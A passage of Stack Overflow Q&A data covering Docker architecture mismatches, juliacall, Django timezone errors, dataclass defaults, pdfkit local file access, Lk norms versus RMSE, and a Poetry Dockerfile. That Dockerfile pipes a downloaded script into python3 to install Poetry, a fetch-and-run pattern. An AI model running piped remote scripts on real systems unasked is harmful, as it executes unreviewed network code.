Pulling docker image rethkevin/rf:v1 ...
Using docker image sha256:d2db066f04bd0c04f69db1622cd73b2fc2e78a5d95a68445618fe54b87f1d31f for rethkevin/rf:v1 with digest rethkevin/rf@sha256:58a500afcbd75ba477aa3076955967cebf66e2f69d4a5c1cca23d69f6775bf6a ...
Preparing environment
00:01
Running on runner-zgjy8gpc-project-1049-concurrent-0 via 1c8189df1d47...
Getting source from Git repository
00:01
Fetching changes with git depth set to 20...
Reinitialized existing Git repository in /builds/reth.bagares/test-rf/.git/
Checking out 339458a3 as main...
Skipping Git submodules setup
Executing &quot;step_script&quot; stage of the job script
00:00
Using docker image sha256:d2db066f04bd0c04f69db1622cd73b2fc2e78a5d95a68445618fe54b87f1d31f for rethkevin/rf:v1 with digest rethkevin/rf@sha256:58a500afcbd75ba477aa3076955967cebf66e2f69d4a5c1cca23d69f6775bf6a ...
exec /usr/bin/sh: exec format error
Cleaning up project directory and file based variables
00:01
ERROR: Job failed: exit code 1
</code></pre>
<p>any thoughts on this to resolve the error?</p>
","73285704","<p>The problem is that you built this image for arm64/v8 -- but your runner is using a different architecture.</p>
<p>If you run:</p>
<pre><code>docker image inspect rethkevin/rf:v1
</code></pre>
<p>You will see this in the output:</p>
<pre><code>...
        &quot;Architecture&quot;: &quot;arm64&quot;,
        &quot;Variant&quot;: &quot;v8&quot;,
        &quot;Os&quot;: &quot;linux&quot;,
...
</code></pre>
<p>Try building and pushing your image from your GitLab CI runner so the architecture of the image will match your runner's architecture.</p>
<p>Alternatively, you can <a href=""https://docs.docker.com/desktop/multi-arch/#build-and-run-multi-architecture-images"" rel=""noreferrer"">build for multiple architectures</a> using <code>docker buildx</code> . Alternatively still, you could also run a GitLab runner on ARM architecture so that it can run the image for the architecture you built it on.</p>
"
"74930922","1","How to load a custom Julia package in Python using Python's juliacall","<p>I already know <a href=""https://stackoverflow.com/questions/73070845/how-to-import-julia-packages-into-python"">How to import Julia packages into Python</a>.</p>
<p>However, now I have created my own simple Julia package with the following command:
<code>using Pkg;Pkg.generate(&quot;MyPack&quot;);Pkg.activate(&quot;MyPack&quot;);Pkg.add(&quot;StatsBase&quot;)</code>
where the file <code>MyPack/src/MyPack.jl</code> has the following contents:</p>
<pre><code>module MyPack
using StatsBase

function f1(x, y)
   return 3x + y
end
g(x) = StatsBase.std(x)

export f1

end
</code></pre>
<p>Now I would like to load this Julia package in Python via <code>juliacall</code> and call <code>f1</code> and <code>g</code> functions.
I have already run <code>pip3 install juliacall</code> from command line. How do I call the above functions from Python?</p>
","74930923","<p>You need to run the following code to load the <code>MyPack</code> package from Python via <code>juliacall</code></p>
<pre><code>from juliacall import Main as jl
from juliacall import Pkg as jlPkg

jlPkg.activate(&quot;MyPack&quot;)  # relative path to the folder where `MyPack/Project.toml` should be used here 

jl.seval(&quot;using MyPack&quot;)
</code></pre>
<p>Now you can use the function (note that calls to non exported functions require package name):</p>
<pre><code>&gt;&gt;&gt; jl.f1(4,7)
19

&gt;&gt;&gt; jl.f1([4,5,6],[7,8,9]).to_numpy()
array([19, 23, 27], dtype=object)

&gt;&gt;&gt; jl.MyPack.g(numpy.arange(0,3))
1.0
</code></pre>
<p>Note another option for calling Julia from Python that seems to be more difficult to configure as of today is the <code>pip install julia</code> package which is described here: <a href=""https://stackoverflow.com/questions/64241264/i-have-a-high-performant-function-written-in-julia-how-can-i-use-it-from-python"">I have a high-performant function written in Julia, how can I use it from Python?</a></p>
"
"73332533","1","Django 4 Error: 'No time zone found with key ...'","<p>After rebuild of my Django 4 Docker container the web service stopped working with this error:</p>
<blockquote>
<p>zoneinfo._common.ZoneInfoNotFoundError: 'No time zone found with key
Asia/Hanoi'</p>
</blockquote>
<p>My setup is:</p>
<ul>
<li>Python 3.10</li>
<li>Django 4.0.5</li>
</ul>
<p>Error:</p>
<pre class=""lang-none prettyprint-override""><code>web_1              
Traceback (most recent call last): web_1          
  File &quot;/usr/local/lib/python3.10/zoneinfo/_common.py&quot;, line 12, in load_tzdata web_1              
    return importlib.resources.open_binary(package_name, resource_name) web_1     
  File &quot;/usr/local/lib/python3.10/importlib/resources.py&quot;, line 46, in open_binary web_1              
    return reader.open_resource(resource) web_1              
  File &quot;/usr/local/lib/python3.10/importlib/abc.py&quot;, line 433, in open_resource web_1              
    return self.files().joinpath(resource).open('rb') web_1              
  File &quot;/usr/local/lib/python3.10/pathlib.py&quot;, line 1119, in open web_1       
    return self._accessor.open(self, mode, buffering, encoding, errors, web_1              
FileNotFoundError: [Errno 2] No such file or directory: '/usr/local/lib/python3.10/site-packages/tzdata/zoneinfo/Asia/Hanoi' web_1              
 web_1              
During handling of the above exception, another exception occurred: web_1              
 web_1              
Traceback (most recent call last): web_1          
  File &quot;/home/app/web/manage.py&quot;, line 22, in &lt;module&gt; web_1         
    main() web_1              
  File &quot;/home/app/web/manage.py&quot;, line 18, in main web_1              
    execute_from_command_line(sys.argv) web_1              
  File &quot;/usr/local/lib/python3.10/site-packages/django/core/management/__init__.py&quot;, line 446, in execute_from_command_line web_1              
    utility.execute() web_1              
  File &quot;/usr/local/lib/python3.10/site-packages/django/core/management/__init__.py&quot;, line 420, in execute web_1              
    django.setup() web_1     
  File &quot;/usr/local/lib/python3.10/site-packages/django/__init__.py&quot;, line 24, in setup web_1              
    apps.populate(settings.INSTALLED_APPS) web_1              
  File &quot;/usr/local/lib/python3.10/site-packages/django/apps/registry.py&quot;, line 116, in populate web_1              
    app_config.import_models() web_1              
  File &quot;/usr/local/lib/python3.10/site-packages/django/apps/config.py&quot;, line 304, in import_models web_1              
    self.models_module = import_module(models_module_name) web_1              
  File &quot;/usr/local/lib/python3.10/importlib/__init__.py&quot;, line 126, in import_module web_1              
    return _bootstrap._gcd_import(name[level:], package, level) web_1              
  File &quot;&lt;frozen importlib._bootstrap&gt;&quot;, line 1050, in _gcd_import web_1              
  File &quot;&lt;frozen importlib._bootstrap&gt;&quot;, line 1027, in _find_and_load web_1              
  File &quot;&lt;frozen importlib._bootstrap&gt;&quot;, line 1006, in _find_and_load_unlocked web_1    
  File &quot;&lt;frozen importlib._bootstrap&gt;&quot;, line 688, in _load_unlocked web_1              
  File &quot;&lt;frozen importlib._bootstrap_external&gt;&quot;, line 883, in exec_module web_1              
  File &quot;&lt;frozen importlib._bootstrap&gt;&quot;, line 241, in _call_with_frames_removed web_1   
  File &quot;/usr/local/lib/python3.10/site-packages/django_celery_beat/models.py&quot;, line 8, in &lt;module&gt; web_1              
    import timezone_field web_1              
  File &quot;/usr/local/lib/python3.10/site-packages/timezone_field/__init__.py&quot;, line 1, in &lt;module&gt; web_1              
    from timezone_field.fields import TimeZoneField web_1              
  File &quot;/usr/local/lib/python3.10/site-packages/timezone_field/fields.py&quot;, line 11, in &lt;module&gt; web_1              
    class TimeZoneField(models.Field): web_1              
  File &quot;/usr/local/lib/python3.10/site-packages/timezone_field/fields.py&quot;, line 41, in TimeZoneField web_1              
    default_zoneinfo_tzs = [ZoneInfo(tz) for tz in pytz.common_timezones] web_1              
  File &quot;/usr/local/lib/python3.10/site-packages/timezone_field/fields.py&quot;, line 41, in &lt;listcomp&gt; web_1              
    default_zoneinfo_tzs = [ZoneInfo(tz) for tz in pytz.common_timezones] web_1              
  File &quot;/usr/local/lib/python3.10/zoneinfo/_common.py&quot;, line 24, in load_tzdata web_1              
    raise ZoneInfoNotFoundError(f&quot;No time zone found with key {key}&quot;) web_1              
zoneinfo._common.ZoneInfoNotFoundError: 'No time zone found with key Asia/Hanoi' web_1              
[2022-08-12 09:18:36 +0000] [1] [INFO] Starting gunicorn 20.0.4 web_1              
[2022-08-12 09:18:36 +0000] [1] [INFO] Listening at: http://0.0.0.0:8000 (1) web_1 
[2022-08-12 09:18:36 +0000] [1] [INFO] Using worker: sync web_1      
[2022-08-12 09:18:36 +0000] [11] [INFO] Booting worker with pid: 11 web_1              
[2022-08-12 12:18:37 +0300] [11] [ERROR] Exception in worker process web_1              
Traceback (most recent call last): web_1              
  File &quot;/usr/local/lib/python3.10/zoneinfo/_common.py&quot;, line 12, in load_tzdata web_1              
    return importlib.resources.open_binary(package_name, resource_name) web_1     
  File &quot;/usr/local/lib/python3.10/importlib/resources.py&quot;, line 46, in open_binary web_1              
    return reader.open_resource(resource) web_1              
  File &quot;/usr/local/lib/python3.10/importlib/abc.py&quot;, line 433, in open_resource web_1              
    return self.files().joinpath(resource).open('rb') web_1              
  File &quot;/usr/local/lib/python3.10/pathlib.py&quot;, line 1119, in open web_1       
    return self._accessor.open(self, mode, buffering, encoding, errors, web_1              
FileNotFoundError: [Errno 2] No such file or directory: '/usr/local/lib/python3.10/site-packages/tzdata/zoneinfo/Asia/Hanoi' web_1              
 web_1              
During handling of the above exception, another exception occurred: web_1              
 web_1              
Traceback (most recent call last): web_1          
  File &quot;/usr/local/lib/python3.10/site-packages/gunicorn/arbiter.py&quot;, line 583, in spawn_worker web_1              
    worker.init_process() web_1              
  File &quot;/usr/local/lib/python3.10/site-packages/gunicorn/workers/base.py&quot;, line 119, in init_process web_1              
    self.load_wsgi() web_1              
  File &quot;/usr/local/lib/python3.10/site-packages/gunicorn/workers/base.py&quot;, line 144, in load_wsgi web_1              
    self.wsgi = self.app.wsgi() web_1              
  File &quot;/usr/local/lib/python3.10/site-packages/gunicorn/app/base.py&quot;, line 67, in wsgi web_1              
    self.callable = self.load() web_1 
  File &quot;/usr/local/lib/python3.10/site-packages/gunicorn/app/wsgiapp.py&quot;, line 49, in load web_1              
    return self.load_wsgiapp() web_1              
  File &quot;/usr/local/lib/python3.10/site-packages/gunicorn/app/wsgiapp.py&quot;, line 39, in load_wsgiapp web_1              
    return util.import_app(self.app_uri) web_1              
  File &quot;/usr/local/lib/python3.10/site-packages/gunicorn/util.py&quot;, line 358, in import_app web_1              
    mod = importlib.import_module(module) web_1              
  File &quot;/usr/local/lib/python3.10/importlib/__init__.py&quot;, line 126, in import_module web_1              
    return _bootstrap._gcd_import(name[level:], package, level) web_1              
  File &quot;&lt;frozen importlib._bootstrap&gt;&quot;, line 1050, in _gcd_import web_1              
  File &quot;&lt;frozen importlib._bootstrap&gt;&quot;, line 1027, in _find_and_load web_1              
  File &quot;&lt;frozen importlib._bootstrap&gt;&quot;, line 1006, in _find_and_load_unlocked web_1    
  File &quot;&lt;frozen importlib._bootstrap&gt;&quot;, line 688, in _load_unlocked web_1              
  File &quot;&lt;frozen importlib._bootstrap_external&gt;&quot;, line 883, in exec_module web_1              
  File &quot;&lt;frozen importlib._bootstrap&gt;&quot;, line 241, in _call_with_frames_removed web_1   
  File &quot;/home/app/web/config/wsgi.py&quot;, line 16, in &lt;module&gt; web_1    
    application = get_wsgi_application() web_1              
  File &quot;/usr/local/lib/python3.10/site-packages/django/core/wsgi.py&quot;, line 12, in get_wsgi_application web_1              
    django.setup(set_prefix=False) web_1              
  File &quot;/usr/local/lib/python3.10/site-packages/django/__init__.py&quot;, line 24, in setup web_1              
    apps.populate(settings.INSTALLED_APPS) web_1              
  File &quot;/usr/local/lib/python3.10/site-packages/django/apps/registry.py&quot;, line 116, in populate web_1              
    app_config.import_models() web_1              
  File &quot;/usr/local/lib/python3.10/site-packages/django/apps/config.py&quot;, line 304, in import_models web_1              
    self.models_module = import_module(models_module_name) web_1              
  File &quot;/usr/local/lib/python3.10/importlib/__init__.py&quot;, line 126, in import_module web_1              
    return _bootstrap._gcd_import(name[level:], package, level) web_1              
  File &quot;&lt;frozen importlib._bootstrap&gt;&quot;, line 1050, in _gcd_import web_1              
  File &quot;&lt;frozen importlib._bootstrap&gt;&quot;, line 1027, in _find_and_load web_1              
  File &quot;&lt;frozen importlib._bootstrap&gt;&quot;, line 1006, in _find_and_load_unlocked web_1    
  File &quot;&lt;frozen importlib._bootstrap&gt;&quot;, line 688, in _load_unlocked web_1              
  File &quot;&lt;frozen importlib._bootstrap_external&gt;&quot;, line 883, in exec_module web_1              
  File &quot;&lt;frozen importlib._bootstrap&gt;&quot;, line 241, in _call_with_frames_removed web_1   
  File &quot;/usr/local/lib/python3.10/site-packages/django_celery_beat/models.py&quot;, line 8, in &lt;module&gt; web_1              
    import timezone_field web_1              
  File &quot;/usr/local/lib/python3.10/site-packages/timezone_field/__init__.py&quot;, line 1, in &lt;module&gt; web_1              
    from timezone_field.fields import TimeZoneField web_1              
  File &quot;/usr/local/lib/python3.10/site-packages/timezone_field/fields.py&quot;, line 11, in &lt;module&gt; web_1              
    class TimeZoneField(models.Field): web_1              
  File &quot;/usr/local/lib/python3.10/site-packages/timezone_field/fields.py&quot;, line 41, in TimeZoneField web_1              
    default_zoneinfo_tzs = [ZoneInfo(tz) for tz in pytz.common_timezones] web_1              
  File &quot;/usr/local/lib/python3.10/site-packages/timezone_field/fields.py&quot;, line 41, in &lt;listcomp&gt; web_1              
    default_zoneinfo_tzs = [ZoneInfo(tz) for tz in pytz.common_timezones] web_1              
  File &quot;/usr/local/lib/python3.10/zoneinfo/_common.py&quot;, line 24, in load_tzdata web_1              
    raise ZoneInfoNotFoundError(f&quot;No time zone found with key {key}&quot;) web_1              
zoneinfo._common.ZoneInfoNotFoundError: 'No time zone found with key Asia/Hanoi' web_1              
[2022-08-12 12:18:37 +0300] [11] [INFO] Worker exiting (pid: 11) web_1              
[2022-08-12 09:18:37 +0000] [1] [INFO] Shutting down: Master web_1              
[2022-08-12 09:18:37 +0000] [1] [INFO] Reason: Worker failed to boot.
</code></pre>
<p>In the Django settings file:</p>
<pre><code>TIME_ZONE = 'UTC'
USE_TZ = True
</code></pre>
<p>PS: As suggested in another post I added <code>tzdata</code> to my requirements file but nothing changed.</p>
","73333278","<p>Downgrading the pytz version from 2022.2 to 2022.1 seems to have solved this issue for me.</p>
"
"73599734","1","Python dataclass, one attribute referencing other","<pre class=""lang-py prettyprint-override""><code>@dataclass
class Stock:
    symbol: str
    price: float = get_price(symbol)
</code></pre>
<p>Can a <code>dataclass</code> attribute access to the other one? In the above example, one can create a <code>Stock</code> by providing a symbol and the price. If price is not provided, it <strong>defaults</strong> to a price which we get from some function <code>get_price</code>. Is there a way to reference symbol?</p>
<p>This example generates error <code>NameError: name 'symbol' is not defined</code>.</p>
","73599883","<p>You can use <a href=""https://peps.python.org/pep-0557/#post-init-processing"" rel=""noreferrer""><code>__post_init__</code></a> here. Because it's going to be called after <code>__init__</code>, you have your attributes already populated so do whatever you want to do there:</p>
<pre class=""lang-py prettyprint-override""><code>from typing import Optional
from dataclasses import dataclass


def get_price(name):
    # logic to get price by looking at `name`.
    return 1000.0


@dataclass
class Stock:
    symbol: str
    price: Optional[float] = None

    def __post_init__(self):
        if self.price is None:
            self.price = get_price(self.symbol)


obj1 = Stock(&quot;boo&quot;, 2000.0)
obj2 = Stock(&quot;boo&quot;)
print(obj1.price)  # 2000.0
print(obj2.price)  # 1000.0
</code></pre>
<p>So if user didn't pass <code>price</code> while instantiating, <code>price</code> is None. So you can check it in <code>__post_init__</code> and ask it from <code>get_price</code>.</p>
"
"73599970","1","How to solve ""wkhtmltopdf reported an error: Exit with code 1 due to network error: ProtocolUnknownError"" in python pdfkit","<p>I'm using Django. This is code is in views.py.</p>
<pre><code>def download_as_pdf_view(request, doc_type, pk):
    import pdfkit
    file_name = 'invoice.pdf'
    pdf_path = os.path.join(settings.BASE_DIR, 'static', 'pdf', file_name)

    template = get_template(&quot;paypal/card_invoice_detail.html&quot;)
    _html = template.render({})
    pdfkit.from_string(_html, pdf_path)

    return FileResponse(open(pdf_path, 'rb'), filename=file_name, content_type='application/pdf')
</code></pre>
<p>Traceback is below.</p>
<pre><code>
[2022-09-05 00:56:35,785] ERROR [django.request.log_response:224] Internal Server Error: /paypal/download_pdf/card_invoice/MTE0Nm1vamlva29zaGkz/
Traceback (most recent call last):
  File &quot;/usr/local/lib/python3.8/site-packages/django/core/handlers/exception.py&quot;, line 47, in inner
    response = get_response(request)
  File &quot;/usr/local/lib/python3.8/site-packages/django/core/handlers/base.py&quot;, line 181, in _get_response
    response = wrapped_callback(request, *callback_args, **callback_kwargs)
  File &quot;/opt/project/app/paypal/views.py&quot;, line 473, in download_as_pdf_view
    pdfkit.from_string(str(_html), pdf_path)
  File &quot;/usr/local/lib/python3.8/site-packages/pdfkit/api.py&quot;, line 75, in from_string
    return r.to_pdf(output_path)
  File &quot;/usr/local/lib/python3.8/site-packages/pdfkit/pdfkit.py&quot;, line 201, in to_pdf
    self.handle_error(exit_code, stderr)
  File &quot;/usr/local/lib/python3.8/site-packages/pdfkit/pdfkit.py&quot;, line 155, in handle_error
    raise IOError('wkhtmltopdf reported an error:\n' + stderr)
OSError: wkhtmltopdf reported an error:
Exit with code 1 due to network error: ProtocolUnknownError

[2022-09-05 00:56:35,797] ERROR [django.server.log_message:161] &quot;GET /paypal/download_pdf/card_invoice/MTE0Nm1vamlva29zaGkz/ HTTP/1.1&quot; 500 107486

</code></pre>
<p>This is work file.</p>
<pre><code>pdfkit.from_url('https://google.com', 'google.pdf')
</code></pre>
<p>However <code>pdfkit.from_string</code> and <code>pdfkit.from_file</code> return &quot;ProtocolUnknownError&quot;</p>
<p>Please help me!</p>
<h2>Update</h2>
<p>I tyied this code.</p>
<pre><code>    _html = '''&lt;html&gt;&lt;body&gt;&lt;h1&gt;Hello world&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;'''
    pdfkit.from_string(_html), pdf_path)
</code></pre>
<p>It worked fine. I saved above html as sample.html. Then run this code</p>
<ul>
<li>I added this parameter <code>options={&quot;enable-local-file-access&quot;: &quot;&quot;}</code></li>
</ul>
<pre><code>    _html = render_to_string('path/to/sample.html')
    pdfkit.from_string(str(_html), pdf_path, options={&quot;enable-local-file-access&quot;: &quot;&quot;})
</code></pre>
<p>It worked fine! And the &quot;ProtocolUnknownError&quot; error is gone thanks to <code>options={&quot;enable-local-file-access&quot;: &quot;&quot;}</code>.</p>
<p>So, I changed the HTML file path to the one I really want to use.</p>
<pre><code>    _html = render_to_string('path/to/invoice.html')
    pdfkit.from_string(_html, pdf_path, options={&quot;enable-local-file-access&quot;: &quot;&quot;})
    return FileResponse(open(pdf_path, 'rb'), filename=file_name, content_type='application/pdf')
</code></pre>
<p>It does not finish convert pdf. When I run the code line by line.</p>
<p><code>stdout, stderr = result.communicate(input=input)</code> does not return.</p>
<p>It was processing long time.</p>
","73603802","<p>I solved this problem. Theare are 3 step to pass this problems.</p>
<ol>
<li><p>You need to set options <code>{&quot;enable-local-file-access&quot;: &quot;&quot;}</code>. <code>pdfkit.from_string(_html, pdf_path, options={&quot;enable-local-file-access&quot;: &quot;&quot;})</code></p>
</li>
<li><p><code>pdfkit.from_string()</code> can't load css from URL. It's something like this.
<code>&lt;link rel=&quot;stylesheet&quot; href=&quot;https://path/to/style.css&quot;&gt;</code> css path should be absolute path or write <code>style</code> in same file.</p>
</li>
<li><p>If css file load another file. ex: font file. It will be <code>ContentNotFoundError</code>.</p>
</li>
</ol>
<h2>My solution</h2>
<p>I used simple css file like this.</p>
<pre><code>body {
    font-size: 18px;
    padding: 55px;
}

h1 {
    font-size: 38px;
}

h2 {
    font-size: 28px;
}

h3 {
    font-size: 24px;
}

h4 {
    font-size: 20px;
}

table, th, td {
    margin: auto;
    text-align: center;
    border: 1px solid;
}

table {
    width: 80%;
}

.text-right {
    text-align: right;
}


.text-left {
    text-align: left;
}

.text-center {
    text-align: center;
}
</code></pre>
<p>This code insert last css file as style in same html.</p>
<pre><code>import os

import pdfkit
from django.http import FileResponse
from django.template.loader import render_to_string

from paypal.models import Invoice
from website import settings


def download_as_pdf_view(request, pk):
    # create PDF from HTML template file with context.
    invoice = Invoice.objects.get(pk=pk)
    context = {
        # please set your contexts as dict.
    }
    _html = render_to_string('paypal/card_invoice_detail.html', context)
     # remove header
    _html = _html[_html.find('&lt;body&gt;'):]  

    # create new header
    new_header = '''&lt;!DOCTYPE html&gt;
    &lt;html lang=&quot;ja&quot;&gt;
    &lt;head&gt;
    &lt;meta charset=&quot;utf-8&quot;/&gt;
    &lt;/head&gt;
    &lt;style&gt;
'''
    # add style from css file. please change to your css file path.
    css_path = os.path.join(settings.BASE_DIR, 'paypal', 'static', 'paypal', 'css', 'invoice.css')
    with open(css_path, 'r') as f:
        new_header += f.read()
    new_header += '\n&lt;/style&gt;'
    print(new_header)

    # add head to html
    _html = new_header + _html[_html.find('&lt;body&gt;'):]
    with open('paypal/sample.html', 'w') as f: f.write(_html)  # for debug

    # convert html to pdf
    file_name = 'invoice.pdf'
    pdf_path = os.path.join(settings.BASE_DIR, 'static', 'pdf', file_name)
    pdfkit.from_string(_html, pdf_path, options={&quot;enable-local-file-access&quot;: &quot;&quot;})
    return FileResponse(open(pdf_path, 'rb'), filename=file_name, content_type='application/pdf')
</code></pre>
"
"73269424","1","Interpreting the effect of LK Norm with different orders on training machine learning model with the presence of outliers","<p><strong>(</strong> Both the <strong>RMSE</strong> and the <strong>MAE</strong> are ways to measure the distance between two vectors: the vector of predictions and the vector of target values. Various distance measures, or norms, are possible. Generally speaking, calculating the size or length of a vector is often required either directly or as part of a broader vector or vector-matrix operation.</p>
<p>Even though the <strong>RMSE</strong> is generally the preferred performance measure for regression tasks, in some contexts you may prefer to use another function. For instance, if there are many outliers instances in the dataset, in this case, we may consider using <em>mean absolute error</em> (MAE).</p>
<p>More formally, the higher the norm index, the more it focuses on large values and neglect small ones. This is why RMSE is more sensitive to outliers than MAE.<strong>)</strong> <em><strong>Source: hands on machine learning with scikit learn and tensorflow.</strong></em></p>
<p>Therefore, ideally, in any dataset, if we have a great number of outliers, the loss function, or the norm of the vector &quot;representing the absolute difference between predictions and true labels; similar to <code>y_diff</code> in the code below&quot; should grow if we increase the norm... In other words, RMSE should be greater than MAE. <strong>--&gt; correct me if mistaken &lt;--</strong></p>
<p>Given this definition, I have generated a random dataset and added many outliers to it as seen in the code below. I calculated the <strong>lk_norm</strong> for the residuals, or <code>y_diff</code> for many k values, ranging from 1 to 5. However, I found that the lk_norm decreases as the value of k increases; however, I was expecting that RMSE, aka norm = 2, to be greater than MAE, aka norm = 1.</p>
<p>I would love to understand how LK norm is decreasing as we increase K, aka the order, which is contrary to the definition above.</p>
<p>Thanks in advance for any help!</p>
<p>Code:</p>
<pre><code>import numpy as np
import plotly.offline as pyo
import plotly.graph_objs as go
from plotly import tools

num_points = 1000
num_outliers = 50

x = np.linspace(0, 10, num_points)

# places where to add outliers:
outlier_locs = np.random.choice(len(x), size=num_outliers, replace=False)
outlier_vals = np.random.normal(loc=1, scale=5, size=num_outliers)

y_true = 2 * x
y_pred = 2 * x + np.random.normal(size=num_points)
y_pred[outlier_locs] += outlier_vals

y_diff = y_true - y_pred

losses_given_lk = []
norms = np.linspace(1, 5, 50)

for k in norms:
    losses_given_lk.append(np.linalg.norm(y_diff, k))

trace_1 = go.Scatter(x=norms, 
                     y=losses_given_lk, 
                     mode=&quot;markers+lines&quot;, 
                     name=&quot;lk_norm&quot;)

trace_2 = go.Scatter(x=x, 
                     y=y_true, 
                     mode=&quot;lines&quot;, 
                     name=&quot;y_true&quot;)

trace_3 = go.Scatter(x=x, 
                     y=y_pred, 
                     mode=&quot;markers&quot;, 
                     name=&quot;y_true + noise&quot;)

fig = tools.make_subplots(rows=1, cols=3, subplot_titles=(&quot;lk_norms&quot;, &quot;y_true&quot;, &quot;y_true + noise&quot;))
fig.append_trace(trace_1, 1, 1)
fig.append_trace(trace_2, 1, 2)
fig.append_trace(trace_3, 1, 3)

pyo.plot(fig, filename=&quot;lk_norms.html&quot;)
</code></pre>
<p>Output:</p>
<p><a href=""https://i.stack.imgur.com/p1gSW.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/p1gSW.png"" alt=""enter image description here"" /></a></p>
<p><strong>Finally, I would love to know, in which cases one uses L3 or L4 norm, etc...?</strong></p>
","73339587","<p>Another python implementation for the <code>np.linalg</code> is:</p>
<pre><code>def my_norm(array, k):
    return np.sum(np.abs(array) ** k)**(1/k)
</code></pre>
<p>To test our function, run the following:</p>
<pre><code>array = np.random.randn(10)
print(np.linalg.norm(array, 1), np.linalg.norm(array, 2), np.linalg.norm(array, 3), np.linalg.norm(array, 10))
# And
print(my_norm(array, 1), my_norm(array, 2), my_norm(array, 3), my_norm(array, 10))
</code></pre>
<p>output:</p>
<pre><code>(9.561258110585216, 3.4545982749318846, 2.5946495606046547, 2.027258231324604)
(9.561258110585216, 3.454598274931884, 2.5946495606046547, 2.027258231324604)
</code></pre>
<p>Therefore, we can see that the numbers are decreasing, similar to our output in the figure posted in the question above.</p>
<p>However, the correct implementation of RMSE in python is: <code>np.mean(np.abs(array) ** k)**(1/k)</code> where <code>k</code> is equal to 2. As a result, I have replaced the <code>sum</code> by the <code>mean</code>.</p>
<p>Therefore, if I add the following function:</p>
<pre><code>def my_norm_v2(array, k):
    return np.mean(np.abs(array) ** k)**(1/k)
</code></pre>
<p>And run the following:</p>
<pre><code>print(my_norm_v2(array, 1), my_norm_v2(array, 2), my_norm_v2(array, 3), my_norm_v2(array, 10))
</code></pre>
<p>Output:</p>
<pre><code>(0.9561258110585216, 1.092439894967332, 1.2043296427640868, 1.610308452218342)
</code></pre>
<p>Hence, the numbers are increasing.</p>
<p>In the code below I rerun the same code posted in the question above with a modified implementation and I got the following:</p>
<pre><code>import numpy as np
import plotly.offline as pyo
import plotly.graph_objs as go
from plotly import tools

num_points = 1000
num_outliers = 50

x = np.linspace(0, 10, num_points)

# places where to add outliers:
outlier_locs = np.random.choice(len(x), size=num_outliers, replace=False)
outlier_vals = np.random.normal(loc=1, scale=5, size=num_outliers)

y_true = 2 * x
y_pred = 2 * x + np.random.normal(size=num_points)
y_pred[outlier_locs] += outlier_vals

y_diff = y_true - y_pred

losses_given_lk = []
losses = []
norms = np.linspace(1, 5, 50)

for k in norms:
    losses_given_lk.append(np.linalg.norm(y_diff, k))
    losses.append(my_norm(y_diff, k))

trace_1 = go.Scatter(x=norms, 
                     y=losses_given_lk, 
                     mode=&quot;markers+lines&quot;, 
                     name=&quot;lk_norm&quot;)

trace_2 = go.Scatter(x=norms, 
                     y=losses, 
                     mode=&quot;markers+lines&quot;, 
                     name=&quot;my_lk_norm&quot;)

trace_3 = go.Scatter(x=x, 
                     y=y_true, 
                     mode=&quot;lines&quot;, 
                     name=&quot;y_true&quot;)

trace_4 = go.Scatter(x=x, 
                     y=y_pred, 
                     mode=&quot;markers&quot;, 
                     name=&quot;y_true + noise&quot;)

fig = tools.make_subplots(rows=1, cols=4, subplot_titles=(&quot;lk_norms&quot;, &quot;my_lk_norms&quot;, &quot;y_true&quot;, &quot;y_true + noise&quot;))
fig.append_trace(trace_1, 1, 1)
fig.append_trace(trace_2, 1, 2)
fig.append_trace(trace_3, 1, 3)
fig.append_trace(trace_4, 1, 4)

pyo.plot(fig, filename=&quot;lk_norms.html&quot;)
</code></pre>
<p>Output:</p>
<p><a href=""https://i.stack.imgur.com/g6xOO.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/g6xOO.png"" alt=""enter image description here"" /></a></p>
<p>And that explains why the loss increase as we increase k.</p>
"
"74106823","1","Working Poetry project with private dependencies inside Docker","<p>I have a Python library hosted in <a href=""https://cloud.google.com/artifact-registry"" rel=""noreferrer"">Google Cloud Platform Artifact Registry</a>. Besides, I have a Python project, using <a href=""https://python-poetry.org/"" rel=""noreferrer"">Poetry</a>, that depends on the library.</p>
<p>This is my project file <code>pyproject.toml</code>:</p>
<pre class=""lang-ini prettyprint-override""><code>[tool.poetry]
name = &quot;Test&quot;
version = &quot;0.0.1&quot;
description = &quot;Test project.&quot;
authors = [
    &quot;Me &lt;me@mycompany.com&gt;&quot;
]

[tool.poetry.dependencies]
python = &quot;&gt;=3.8,&lt;4.0&quot;
mylib = &quot;0.1.1&quot;

[tool.poetry.dev-dependencies]
&quot;keyrings.google-artifactregistry-auth&quot; = &quot;^1.1.0&quot;
keyring = &quot;^23.9.0&quot;

[build-system]
requires = [&quot;poetry-core&gt;=1.1.0&quot;]
build-backend = &quot;poetry.core.masonry.api&quot;

[[tool.poetry.source]]
name = &quot;my-lib&quot;
url = &quot;https://us-east4-python.pkg.dev/my-gcp-project/my-lib/simple/&quot;
secondary = true

</code></pre>
<p>To enable using my private repository, I installed <a href=""https://cloud.google.com/sdk/gcloud"" rel=""noreferrer"">gcloud CLI</a> and authenticated with my credentials. So when I run this command, I see proper results, like this:</p>
<pre class=""lang-bash prettyprint-override""><code>$ gcloud auth list
ACTIVE  ACCOUNT
...
*       &lt;my-account&gt;@appspot.gserviceaccount.com
...
</code></pre>
<p>Additionally, I'm using <a href=""https://pypi.org/project/keyring/"" rel=""noreferrer"">Python keyring</a> togheter with <a href=""https://pypi.org/project/keyrings.google-artifactregistry-auth/"" rel=""noreferrer"">keyrings.google-artifactregistry-auth</a>, as you can see in the project file.</p>
<p>So, with this setup, I can run <code>poetry install</code>, the dependency gets downloaded from my private artifact registry, using the authentication from GCP.</p>
<hr />
<p>The issue comes when I try to apply the same principles inside a Docker container.</p>
<p>I created a Docker file like this:</p>
<pre><code># syntax = docker/dockerfile:1.3
FROM python:3.9

# Install Poetry
RUN curl -sSL https://install.python-poetry.org | python3 -
ENV PATH &quot;${PATH}:/root/.local/bin&quot;

# Install Google Cloud SDK CLI
ARG GCLOUD_VERSION=&quot;401.0.0-linux-x86_64&quot;
RUN wget -q https://dl.google.com/dl/cloudsdk/channels/rapid/downloads/google-cloud-cli-${GCLOUD_VERSION}.tar.gz &amp;&amp; \
    tar -xf google-cloud-cli-*.tar.gz &amp;&amp; \
    ./google-cloud-sdk/install.sh --quiet &amp;&amp; \
    rm google-cloud-cli-*.tar.gz
ENV PATH &quot;${PATH}:/google-cloud-sdk/bin&quot;

# install Google Artifact Rrgistry keyring integration
RUN pip install keyrings.google-artifactregistry-auth
